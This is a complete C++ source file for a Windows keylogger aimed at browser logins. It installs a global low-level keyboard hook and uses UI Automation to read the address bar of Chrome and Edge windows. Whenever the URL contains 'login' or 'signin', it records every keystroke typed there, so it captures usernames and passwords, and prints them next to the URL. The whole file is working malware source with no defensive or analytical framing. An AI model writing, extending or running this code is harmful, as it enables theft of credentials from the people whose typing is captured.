#include <windows.h>
#include <ole2.h>
#include <uiautomation.h>
#include <psapi.h>
#include <iostream>
#include <string>
#include <unordered_set>
#include <map>
#include <thread>
#include <mutex>
#include <atomic>
#include <comdef.h>

#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "uiautomationcore.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "user32.lib")

// Globals
std::mutex g_mutex;
std::atomic<bool> g_running(true);
IUIAutomation* g_automation = nullptr;
HHOOK g_hHook = nullptr;

// Mapping HWND => URL for tracked login tabs
std::map<HWND, std::wstring> g_trackedWindows;

// Special keys mapping
std::map<DWORD, std::wstring> specialKeys = {
    {VK_BACK, L"[Backspace]"},
    {VK_TAB, L"[Tab]"},
    {VK_RETURN, L"[Enter]\n"},
    {VK_SHIFT, L"[Shift]"},
    {VK_CONTROL, L"[Ctrl]"},
    {VK_MENU, L"[Alt]"},
    {VK_ESCAPE, L"[Esc]"},
    {VK_SPACE, L" "},
    {VK_DELETE, L"[Delete]"},
    {VK_LEFT, L"[Left]"},
    {VK_RIGHT, L"[Right]"},
    {VK_UP, L"[Up]"},
    {VK_DOWN, L"[Down]"},
    {VK_CAPITAL, L"[CapsLock]"},
    {VK_HOME, L"[Home]"},
    {VK_END, L"[End]"},
    {VK_NEXT, L"[PageDown]"},
    {VK_PRIOR, L"[PageUp]"},
    {VK_INSERT, L"[Insert]"},
    {VK_LWIN, L"[LWin]"},
    {VK_RWIN, L"[RWin]"},
};

// Utility: Get process name for a HWND
std::wstring GetProcessName(HWND hwnd) {
    DWORD pid = 0;
    GetWindowThreadProcessId(hwnd, &pid);
    HANDLE hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ, FALSE, pid);
    if (!hProc) return L"";

    WCHAR name[MAX_PATH] = {0};
    if (GetModuleBaseNameW(hProc, nullptr, name, MAX_PATH) == 0) {
        CloseHandle(hProc);
        return L"";
    }
    CloseHandle(hProc);
    return std::wstring(name);
}

// Get browser URL via UIAutomation
bool GetBrowserURL(HWND hwnd, std::wstring& url) {
    if (!g_automation) return false;
    IUIAutomationElement* root = nullptr;
    if (FAILED(g_automation->ElementFromHandle(hwnd, &root)) || !root)
        return false;

    VARIANT varProp;
    varProp.vt = VT_BSTR;
    varProp.bstrVal = SysAllocString(L"Address and search bar");

    IUIAutomationCondition* cond = nullptr;
    if (FAILED(g_automation->CreatePropertyCondition(UIA_NamePropertyId, varProp, &cond))) {
        SysFreeString(varProp.bstrVal);
        root->Release();
        return false;
    }
    SysFreeString(varProp.bstrVal);

    IUIAutomationElement* addressBar = nullptr;
    bool found = false;
    if (SUCCEEDED(root->FindFirst(TreeScope_Descendants, cond, &addressBar)) && addressBar) {
        IUIAutomationValuePattern* valPattern = nullptr;
        if (SUCCEEDED(addressBar->GetCurrentPattern(UIA_ValuePatternId, (IUnknown**)&valPattern)) && valPattern) {
            BSTR bstrUrl = nullptr;
            if (SUCCEEDED(valPattern->get_CurrentValue(&bstrUrl)) && bstrUrl) {
                url = std::wstring(bstrUrl);
                SysFreeString(bstrUrl);
                found = true;
            }
            valPattern->Release();
        }
        addressBar->Release();
    }

    cond->Release();
    root->Release();
    return found;
}

// Get top level window from any HWND
HWND GetTopLevelWindow(HWND hwnd) {
    if (!hwnd) return nullptr;
    HWND tl = GetAncestor(hwnd, GA_ROOT);
    return tl ? tl : hwnd;
}

// Check if process is supported browser
bool IsBrowserProcess(const std::wstring& procName) {
    // Add other browsers here if you want
    return (procName == L"chrome.exe" || procName == L"msedge.exe");
}

// EnumWindows callback to find windows with login URLs
BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) {
    if (!IsWindowVisible(hwnd)) return TRUE;

    std::wstring procName = GetProcessName(hwnd);
    if (!IsBrowserProcess(procName))
        return TRUE;

    std::wstring url;
    if (!GetBrowserURL(hwnd, url))
        return TRUE;

	if (url.find(L"login") == std::wstring::npos && url.find(L"signin") == std::wstring::npos)
		return TRUE;

    std::unordered_set<HWND>* currentSet = (std::unordered_set<HWND>*)lParam;
    currentSet->insert(hwnd);

    {
        std::lock_guard<std::mutex> lock(g_mutex);
        g_trackedWindows[hwnd] = url;  // Add or update tracked windows
    }
    return TRUE;
}

// Convert VK code to readable string, handling special keys
std::wstring VkCodeToReadable(DWORD vkCode) {
    auto it = specialKeys.find(vkCode);
    if (it != specialKeys.end())
        return it->second;

    BYTE keyboardState[256] = {0};
    if ((GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0)
        keyboardState[VK_SHIFT] = 0x80;
    if ((GetAsyncKeyState(VK_CAPITAL) & 0x0001) != 0)
        keyboardState[VK_CAPITAL] = 0x01;

    WCHAR buf[8] = {0};
    int ret = ToUnicode(vkCode, MapVirtualKey(vkCode, MAPVK_VK_TO_VSC), keyboardState, buf, 8, 0);
    if (ret > 0) {
        return std::wstring(buf, ret);
    }

    return L"[Unknown]";
}

// Keyboard hook callback
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* kb = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vkCode = kb->vkCode;

        HWND foreground = GetForegroundWindow();
        HWND topLevel = GetTopLevelWindow(foreground);

        std::wstring keyStr = VkCodeToReadable(vkCode);

        std::lock_guard<std::mutex> lock(g_mutex);
        auto it = g_trackedWindows.find(topLevel);
        if (it != g_trackedWindows.end()) {
            // Print with window URL header if first key after URL printed or URL changed
            static std::map<HWND, std::wstring> lastUrlPrinted;
            if (lastUrlPrinted[topLevel] != it->second) {
                std::wcout << L"\n[hooked] URL: " << it->second << std::endl;
                std::wcout << L"Text: " << std::flush;
                lastUrlPrinted[topLevel] = it->second;
            }
            std::wcout << keyStr << std::flush;
        }
    }
    return CallNextHookEx(g_hHook, nCode, wParam, lParam);
}

// Thread function to watch browser windows/tabs
void BrowserWindowWatcher() {
    std::unordered_set<HWND> prevSet;

    while (g_running) {
        std::unordered_set<HWND> currentSet;

        EnumWindows(EnumWindowsProc, (LPARAM)&currentSet);

        {
            std::lock_guard<std::mutex> lock(g_mutex);

            // Remove windows that disappeared or changed URL away from login -> unhook
            for (auto it = g_trackedWindows.begin(); it != g_trackedWindows.end(); ) {
                if (currentSet.find(it->first) == currentSet.end()) {
                    std::wcout << L"\n[unhooked] URL: " << it->second << std::endl;
                    it = g_trackedWindows.erase(it);
                } else {
                    ++it;
                }
            }

            // Add new windows
            for (HWND hwnd : currentSet) {
                if (g_trackedWindows.find(hwnd) == g_trackedWindows.end()) {
                    std::wstring url;
                    if (GetBrowserURL(hwnd, url) && url.find(L"login") != std::wstring::npos) {
                        g_trackedWindows[hwnd] = url;
                        std::wcout << L"\n[hooked] URL: " << url << std::endl << L"Text: " << std::flush;
                    }
                }
            }
        }
        std::this_thread::sleep_for(std::chrono::seconds(2));
    }
}

int main() {
    HRESULT hr = CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
    if (FAILED(hr)) {
        std::cerr << "Failed to initialize COM." << std::endl;
        return 1;
    }

    hr = CoCreateInstance(__uuidof(CUIAutomation), nullptr, CLSCTX_INPROC_SERVER,
                          __uuidof(IUIAutomation), (void**)&g_automation);
    if (FAILED(hr) || !g_automation) {
        std::cerr << "Failed to create UIAutomation instance." << std::endl;
        CoUninitialize();
        return 1;
    }

    std::thread watcherThread(BrowserWindowWatcher);

    std::wcout << L"Keyboard hook started. Typing captured only on browsers with URL containing 'login'. Press ESC to quit.\n";

    g_hHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, nullptr, 0);
    if (!g_hHook) {
        std::cerr << "Failed to install keyboard hook." << std::endl;
        g_running = false;
        watcherThread.join();
        g_automation->Release();
        CoUninitialize();
        return 1;
    }

    MSG msg;
    while (GetMessage(&msg, nullptr, 0, 0)) {
        if (msg.message == WM_KEYDOWN && msg.wParam == VK_ESCAPE) {
            break;
        }
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    g_running = false;
    UnhookWindowsHookEx(g_hHook);
    watcherThread.join();

    g_automation->Release();
    CoUninitialize();

    std::wcout << L"\nExiting...\n";
    return 0;
}
